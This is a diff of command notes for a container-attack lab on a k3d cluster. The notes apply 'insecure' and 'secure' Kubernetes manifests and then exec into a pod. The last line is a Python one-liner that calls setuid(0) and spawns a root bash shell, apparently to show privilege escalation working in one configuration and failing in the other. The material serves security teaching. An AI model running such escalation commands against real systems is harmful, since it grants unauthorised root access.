@@ -1,11 +1,11 @@
 # Build image
 docker build . -t custom-python:local
 
-# Apply k8s manifest
-k apply -f insecure.yaml
-
 # Import image
 k3d image import custom-python:local -c container-attack
+
+# Apply k8s manifest
+k apply -f insecure.yaml
 
 # Connect to container
 k exec -it ubuntu -- bash
@@ -28,6 +28,9 @@ k delete pod ubuntu --force
 
 # Apply k8s manifest
 k apply -f secure.yaml
+
+# Connect to container
+k exec -it ubuntu -- bash
 
 # No fun & no profit
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
